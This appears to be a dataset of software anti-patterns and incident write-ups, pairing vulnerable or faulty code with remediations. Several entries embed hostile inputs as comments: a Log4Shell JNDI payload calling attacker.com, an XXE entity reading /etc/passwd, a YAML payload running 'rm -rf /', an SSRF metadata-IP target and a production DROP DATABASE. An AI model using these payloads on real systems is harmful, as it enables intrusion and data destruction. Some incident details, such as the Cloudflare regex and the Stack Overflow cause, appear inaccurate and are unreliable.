title: Cloudflare outage caused by catastrophic regex backtracking in WAF rule
anti_pattern: Regular expression with nested quantifiers causing O(2^n) backtracking: (?:(?:\")+)+
code_example:
import re
pattern = re.compile(r'(?:(?:\")+)+')
# Catastrophic: input length 30 = 2^30 backtrack steps
remediation: Use RE2 engine (no backtracking), add regex timeout, avoid nested quantifiers. Replace with possessive quantifiers or atomic groups.

title: Stack Overflow outage from ReDoS in email validation
anti_pattern: Using (\w+)+ patterns in email validation regex causing catastrophic backtracking on malformed input
remediation: Use simple regex patterns or a dedicated email validation library with timeout. Test with adversarial inputs.

title: Catastrophic backtracking in URI regex used in node.js HTTP server
anti_pattern: URI regex with overlapping character classes (/^([a-z][a-z0-9+.-]*):/) that backtrack on deeply nested paths
code_example:
const uriRegex = /^([a-z][a-z0-9+.-]*):([\/]{0,2}[^\s]*)/i;
// Pathological: 'aaaaaaaaaaaaaaaaaaaaaaab'
remediation: Use RE2 via the re2 npm package. Add input length limits. Use iterative parsers instead of regex for URIs.

title: ReDoS vulnerability in moment.js date parsing
anti_pattern: Using complex date format regex with nested optional groups that degrades to exponential time on invalid input
remediation: Upgrade to moment.js >= 2.15.1. Add strict parsing mode. Validate date string length before parsing.

title: Redis INCR race condition causing double charge in payment system
anti_pattern: Check-then-act pattern without atomicity: checking a value and then updating it in separate operations
code_example:
count = redis.get('payment_attempts')
if count < MAX_ATTEMPTS:
    # race window here
    redis.incr('payment_attempts')
    charge_customer()
remediation: Use Redis atomic operations (INCR then check), Lua scripts for compound operations, or distributed locks.

title: Go map concurrent write causing runtime panic in Kubernetes
anti_pattern: Concurrent writes to a non-synchronized Go map causing 'concurrent map writes' fatal runtime error
code_example:
cache := make(map[string]Endpoint)
go func() { cache[key] = endpoint }()  // goroutine 1
go func() { cache[key2] = endpoint2 }() // goroutine 2 — FATAL
remediation: Use sync.Map for concurrent access, or protect map with sync.RWMutex.

title: Database connection pool exhaustion from unhandled goroutine leak
anti_pattern: Starting goroutines that wait on channels without any cancellation mechanism, leaking indefinitely
remediation: Use context.Context for cancellation. Always pair goroutine launch with a done/cancel signal. Use errgroup.

title: Python asyncio event loop blocking from synchronous DB call
anti_pattern: Calling synchronous blocking I/O inside async function without run_in_executor, starving the event loop
code_example:
async def get_user(user_id: int):
    # Blocks the entire event loop!
    conn = psycopg2.connect(DATABASE_URL)
    return conn.execute('SELECT * FROM users WHERE id=%s', [user_id])
remediation: Use async database drivers (asyncpg, databases, SQLAlchemy async). Never call blocking I/O in async functions.

title: Python unhandled exception in background thread silently terminating process
anti_pattern: Background threads where unhandled exceptions are swallowed silently, making debugging impossible
code_example:
def background_worker():
    while True:
        task = queue.get()
        process(task)  # If this raises, thread dies silently

thread = Thread(target=background_worker)
thread.daemon = True
thread.start()
remediation: Wrap thread body in try/except, use threading.excepthook, log all exceptions, implement restart policy.

title: Node.js unhandled promise rejection causing silent request failure
anti_pattern: async functions called without await and without .catch(), causing promise rejections to be swallowed
remediation: Always await async calls or attach .catch(). Enable --unhandled-rejections=throw. Use express-async-errors.

title: Java NullPointerException cascade in payment processing
anti_pattern: Chained method calls on potentially null objects without null checks, causing NPE in production
code_example:
// NPE if getUser() or getAddress() returns null
String city = request.getUser().getAddress().getCity().toUpperCase();
remediation: Use Optional<T>, add explicit null checks, or use Objects.requireNonNull with descriptive messages.

title: Log4Shell: remote code execution via JNDI lookup in log message
anti_pattern: Logging untrusted user input directly through log4j without sanitization, enabling JNDI injection
code_example:
logger.info("User login attempt: " + username);
// Attacker sends: ${jndi:ldap://attacker.com/exploit}
remediation: Upgrade to log4j >= 2.17.1. Disable JNDI lookups (-Dlog4j2.formatMsgNoLookups=true). Sanitize user input before logging.

title: SSRF via URL parameter in internal microservice
anti_pattern: Fetching URLs from user-supplied input without validation, enabling SSRF to internal metadata service
code_example:
url = request.args.get('url')
response = requests.get(url)  # SSRF: attacker can hit 169.254.169.254
remediation: Validate URL against allowlist. Block private IP ranges. Use a proxy with SSRF protection. Disable IMDSv1.

title: Command injection via unsanitized filename in shell subprocess
anti_pattern: Passing user-controlled input to shell commands via string interpolation instead of argument list
code_example:
import subprocess
filename = request.form['filename']
result = subprocess.run(f'convert {filename} output.png', shell=True)
remediation: Use subprocess with list arguments (shell=False). Validate and sanitize filenames. Use shlex.quote() if shell=True is unavoidable.

title: Path traversal via unsanitized file path in static file server
anti_pattern: Serving files from a path constructed with user input without canonicalization, enabling ../../etc/passwd traversal
code_example:
const filepath = path.join(__dirname, 'files', req.params.filename);
res.sendFile(filepath);  // No check that filepath is within 'files' dir
remediation: Use path.resolve() and verify result starts with allowed base directory. Reject paths containing '..'.

title: AWS Lambda memory exhaustion from unbounded DynamoDB scan
anti_pattern: Calling DynamoDB.scan() without pagination in Lambda, loading entire table into memory
code_example:
response = table.scan()  # Loads ALL items — fails at scale
items = response['Items']
# Missing: LastEvaluatedKey pagination loop
remediation: Always paginate DynamoDB scans. Use Query with an index when possible. Implement streaming processing with generators.

title: OOM kill from loading multi-GB CSV into pandas DataFrame
anti_pattern: Using pd.read_csv() on large files without chunksize, loading entire file into memory causing OOM
code_example:
df = pd.read_csv('events.csv')  # 50GB file crashes 16GB RAM instance
result = df.groupby('user_id').sum()
remediation: Use pd.read_csv(chunksize=N) for streaming. Use Dask or Polars for large datasets. Use Parquet with column pruning.

title: File descriptor exhaustion from missing file handle close in loop
anti_pattern: Opening files in a loop without using context managers, exhausting OS file descriptor limit
code_example:
for path in file_list:  # 10,000 files
    f = open(path)
    data = f.read()
    process(data)
    # Missing: f.close() or with statement
remediation: Always use 'with open(path) as f:' context manager. Set resource limits. Monitor file descriptor usage.

title: HTTP connection pool exhaustion from missing response.close()
anti_pattern: Making HTTP requests in a loop without closing the response, exhausting the connection pool
remediation: Use 'with requests.get(url) as resp:' or call resp.close() explicitly. Use requests.Session for connection reuse.

title: Kubernetes pod eviction from container without resource limits
anti_pattern: Deploying containers without CPU/memory limits in Kubernetes, causing node resource contention and OOM kills
code_example:
containers:
  - name: api
    image: api:latest
    # Missing: resources.limits and resources.requests
remediation: Set resources.requests and resources.limits for all containers. Use LimitRange to enforce defaults.

title: JWT algorithm confusion attack — none algorithm accepted
anti_pattern: Accepting JWTs with 'none' algorithm or not explicitly specifying accepted algorithms, enabling algorithm confusion attacks
code_example:
// Vulnerable: accepts any algorithm including 'none'
jwt.verify(token, secret)  // Should be: jwt.verify(token, secret, { algorithms: ['HS256'] })
remediation: Always specify allowed algorithms explicitly. Reject 'none' algorithm. Use asymmetric keys for multi-service verification.

title: Mass assignment vulnerability in Rails model allows privilege escalation
anti_pattern: Using params directly in ActiveRecord without attr_accessible/strong_parameters, allowing role/admin field injection
remediation: Use Strong Parameters (require + permit). Never pass raw params to model constructors.

title: IDOR — missing authorization check allows reading other users' data
anti_pattern: Fetching resource by ID from user input without checking if the authenticated user owns that resource
remediation: Always verify resource ownership. Add authorization check after fetching. Use row-level security in DB.

title: Integer overflow in image dimension multiplication causing heap buffer underflow
anti_pattern: Multiplying image width * height without overflow check when computing allocation size
remediation: Use checked arithmetic (use __builtin_mul_overflow in GCC). Validate dimensions against maximum values before multiplication.

title: Missing HTTPS enforcement allows credential interception in production
anti_pattern: Allowing HTTP (non-TLS) traffic to API endpoints that handle authentication credentials
code_example:
# Flask app without HTTPS enforcement
app = Flask(__name__)
# Missing: app.config['PREFERRED_URL_SCHEME'] = 'https'
# Missing: SSLify(app) or reverse proxy HTTPS redirect
remediation: Enforce HTTPS with HSTS headers. Redirect HTTP to HTTPS. Use TLS termination at load balancer.

title: Knight Capital Group: wrong feature flag enabled deploys 8-year-old code, loses $440M in 45 minutes
anti_pattern: Reusing a decommissioned feature flag name for new functionality without verifying flag state on all servers
remediation: Delete decommissioned code paths entirely. Use timestamped/versioned flag names. Verify flag state across all nodes before deployment.

title: Heroku ENV variable exposure via misconfigured logging at startup
anti_pattern: Logging os.environ or process.env at application startup, exposing secrets to log aggregation systems
code_example:
import os
logging.info(f'App starting with config: {dict(os.environ)}')  # Logs DATABASE_URL, SECRET_KEY, etc.
remediation: Never log environment variables. Log only a curated list of non-sensitive config keys. Use structured logging with field allowlists.

title: Canary deployment rolled out to 100% without smoke tests due to misconfigured pipeline
anti_pattern: CI/CD pipeline missing stage gate that checks smoke test results before proceeding to next deployment stage
code_example:
# GitHub Actions missing condition check
- name: Deploy canary
  run: deploy.sh --canary 10%
# Missing: smoke test step before proceeding to 100%
- name: Deploy production
  run: deploy.sh --full
remediation: Add mandatory smoke test gates between deployment stages. Block rollout on test failure. Use deployment circuits.

title: Missing database transaction causes partial order state on crash
anti_pattern: Performing multiple related database writes without wrapping them in a transaction, leaving partial state on failure
code_example:
def place_order(cart):
    order = create_order(cart)         # write 1
    deduct_inventory(cart.items)       # write 2 — if this fails, order exists but inventory not deducted
    charge_payment(cart.total)         # write 3
    send_confirmation_email(order)     # write 4
remediation: Wrap all related writes in a database transaction. Use saga pattern for distributed transactions across services.

title: Double-spend vulnerability from optimistic lock missing on payment record
anti_pattern: Reading and updating a record without version check, allowing concurrent requests to both succeed on the same resource
code_example:
balance = account.balance
if balance >= amount:
    account.update(balance: balance - amount)  # No WHERE version=N check
    process_payment(amount)
remediation: Use optimistic locking (version column). Check version in UPDATE WHERE clause. Retry on version conflict.

title: Flyway migration leaves DB in inconsistent state when node crashes mid-migration
anti_pattern: DDL migrations with multiple steps not wrapped in a single transaction, leaving partial schema on failure
remediation: Wrap multi-statement migrations in a transaction (where DB supports transactional DDL — PostgreSQL does). Add compensation migrations.

title: Event sourcing sequence gap from non-monotonic ID generation in distributed system
anti_pattern: Using UUID v4 or random IDs as event sequence numbers, making gap detection and ordering impossible
code_example:
event_id = str(uuid.uuid4())  # Random: cannot detect gaps or order
publish_event(event_id, payload)
remediation: Use monotonic sequences (DB sequence, Snowflake IDs, ULID). Track last processed sequence for gap detection.

title: Python pickle deserialization RCE in distributed task queue
anti_pattern: Using pickle to deserialize task arguments from Redis/RabbitMQ queue, enabling RCE if queue is compromised
remediation: Use JSON serialization. Set CELERY_TASK_SERIALIZER='json'. Never use pickle for untrusted input.

title: XML External Entity (XXE) injection in document parser
anti_pattern: Parsing XML with external entity expansion enabled, allowing file disclosure and SSRF via DOCTYPE declarations
code_example:
from lxml import etree
parser = etree.XMLParser()  # Default: allows XXE
tree = etree.parse(user_xml_file, parser)
# Attacker DOCTYPE: <!ENTITY xxe SYSTEM 'file:///etc/passwd'>
remediation: Disable external entity processing. Use defusedxml in Python. Set XMLConstants.FEATURE_SECURE_PROCESSING in Java.

title: Hardcoded AWS credentials committed to public GitHub repository
anti_pattern: Hardcoding cloud provider credentials (AWS_ACCESS_KEY_ID, etc.) directly in source code instead of using environment variables
code_example:
AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE'
AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
s3 = boto3.client('s3')
remediation: Use IAM roles (EC2/ECS/Lambda). Load credentials from environment or AWS credential file. Use AWS Secrets Manager.

title: Eval() used to parse JSON in Node.js, enabling code injection
anti_pattern: Using eval() to parse JSON from user input or API responses instead of JSON.parse()
remediation: Always use JSON.parse() for JSON parsing. Never use eval() with untrusted input.

title: S3 bucket ACL misconfiguration exposes customer data publicly
anti_pattern: Creating S3 buckets without explicit Block Public Access settings, relying on default ACLs that change over time
code_example:
aws s3api create-bucket --bucket my-data-bucket --region us-east-1
# Missing: --no-object-lock-enabled and Block Public Access configuration
# aws s3api put-public-access-block --bucket my-data-bucket --public-access-block-configuration ...
remediation: Always enable S3 Block Public Access at bucket and account level. Use S3 Object Lock for compliance data.

title: AWS US-EAST-1 cascading failure: ELB health check backlog triggers ASG thrashing
anti_pattern: Auto-scaling groups triggering on ELB health check failures without backoff, creating oscillating launch/terminate loops
code_example:
# ASG config without protection from flapping
ScalingPolicy:
  AdjustmentType: ChangeInCapacity
  ScalingAdjustment: -1
  # Missing: InstanceWarmup and cooldown periods
remediation: Set ASG cooldown periods. Use step scaling with warmup. Implement instance protection during health checks.

title: Thundering herd: cache expiry stampede crashes database
anti_pattern: All cache entries for a hot key expiring simultaneously, causing all requests to hit the database at once
code_example:
value = cache.get(key)
if value is None:
    value = db.query(expensive_query)  # 10,000 concurrent requests hit DB
    cache.set(key, value, ttl=3600)    # All set same expiry — herd happens hourly
remediation: Add jitter to cache TTLs (random offset). Use probabilistic early expiration. Implement cache stampede protection with locking.

title: Service mesh mTLS certificate expiry causes cluster-wide outage
anti_pattern: Short-lived mTLS certificates without automated rotation, causing simultaneous expiry of all inter-service connections
code_example:
# Istio PeerAuthentication without cert rotation monitoring
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
spec:
  mtls:
    mode: STRICT
# Missing: cert rotation alerts and automatic renewal
remediation: Automate certificate rotation before expiry. Alert at 14-day and 7-day thresholds. Test rotation in staging monthly.

title: Retry storm amplification: failed downstream service flooded by exponential retries
anti_pattern: Retry loops without exponential backoff and jitter, multiplying load on an already-struggling downstream service
remediation: Use exponential backoff with jitter. Implement circuit breaker. Respect Retry-After headers. Cap total retry duration.

title: Bulkhead missing: single slow API endpoint exhausts shared thread pool
anti_pattern: All API endpoints sharing a single thread pool without bulkheads, so one slow endpoint starves all others
remediation: Use Hystrix/Resilience4j bulkhead pattern. Assign separate thread pools to critical paths. Set per-endpoint timeout.

title: GitLab database incident: accidental deletion of production DB during maintenance
anti_pattern: Running destructive database commands (DROP, DELETE) directly on production without dry-run or confirmation prompt
code_example:
# Engineer ran on production instead of staging
psql -U gitlab -c 'DROP DATABASE gitlabhq_production;'
# No: --dry-run, no: target environment check, no: backup verification
remediation: Require explicit environment confirmation for destructive operations. Add --dry-run mode. Verify backups before maintenance.

title: Blue-green deployment DNS TTL too high causes traffic split during rollback
anti_pattern: DNS TTL set to hours instead of seconds for service records, preventing fast rollback during incidents
code_example:
# Route53 record with 24-hour TTL
Type: A
TTL: 86400  # 86400 seconds = 24 hours
# During incident: DNS change takes 24h to propagate globally
remediation: Set TTL to 60s for actively deployed services. Lower TTL 24h before planned deployments. Use health-check-based routing.

title: Fibonacci-style recursive Fibonacci without memoization causes CPU starvation
anti_pattern: Recursive functions with overlapping subproblems and no memoization, causing exponential time complexity
remediation: Use @functools.lru_cache or explicit memoization. Use iterative solution. Add input size validation.

title: N+1 query problem in GraphQL resolver causes DB overload
anti_pattern: Fetching related records inside a loop, executing N+1 database queries instead of one batched query
remediation: Use DataLoader for batching in GraphQL. Use SQLAlchemy selectinload/joinedload. Use JOIN queries instead of nested fetches.

title: GCP Compute Engine incident: cascading failure from configuration push without canary
anti_pattern: Pushing configuration changes to all instances simultaneously without staged rollout, causing global service disruption
remediation: Use staged rollouts (1% → 5% → 25% → 100%). Add automated rollback on error rate increase. Never deploy to all regions simultaneously.

title: Gunicorn worker timeout cascade from CPU-bound task blocking worker pool
anti_pattern: Running CPU-intensive operations synchronously in Gunicorn worker, blocking it for all other requests
remediation: Offload CPU-bound tasks to Celery/background workers. Use async workers (gevent/asyncio). Set appropriate timeouts.

title: Deserialization of untrusted YAML executes arbitrary Python code
anti_pattern: Using yaml.load() (unsafe) instead of yaml.safe_load() on user-supplied YAML input
code_example:
import yaml
config = yaml.load(user_input)  # RCE: !!python/object/apply:os.system ['rm -rf /']
remediation: Always use yaml.safe_load() for untrusted input. Use yaml.load() only with yaml.Loader=yaml.SafeLoader.

title: Prototype pollution in lodash merge enables DoS and property injection
anti_pattern: Using _.merge() or _.defaultsDeep() with user-controlled keys, enabling prototype pollution via __proto__ injection
remediation: Validate and sanitize object keys. Use Object.create(null) for maps. Upgrade lodash >= 4.17.12.

title: Timezone-naive datetime comparison causes DST-related billing discrepancy
anti_pattern: Using timezone-naive datetime objects in business logic that spans DST transitions, causing off-by-one-hour errors
code_example:
from datetime import datetime
start = datetime(2022, 11, 6, 1, 30)  # Ambiguous during DST fallback
end = datetime(2022, 11, 6, 2, 30)   # Duration is either 1h or 2h
remediation: Always use timezone-aware datetimes (datetime.now(tz=timezone.utc)). Store all timestamps as UTC in database.

title: Missing idempotency key allows duplicate charges on payment retry
anti_pattern: Making payment API calls without idempotency keys, so network retries create duplicate charges
code_example:
# Network error → client retries → two charges!
stripe.PaymentIntent.create(
    amount=2000,
    currency='usd'
    # Missing: idempotency_key=order_id
)
remediation: Always pass idempotency_key for payment operations. Use order/request ID as key. Check existing payment before creating new.

title: Facebook BGP misconfiguration takes down DNS and causes 6-hour global outage
anti_pattern: BGP configuration change that withdraws all route announcements without rollback capability, cutting off DNS and internal tooling simultaneously
code_example:
# BGP misconfiguration removed backbone routes
# No canary testing of network config changes
# Internal tools (for rollback) routed through same network
remediation: Test BGP config changes in isolated environment. Maintain out-of-band management network. Have offline runbooks and phone trees.
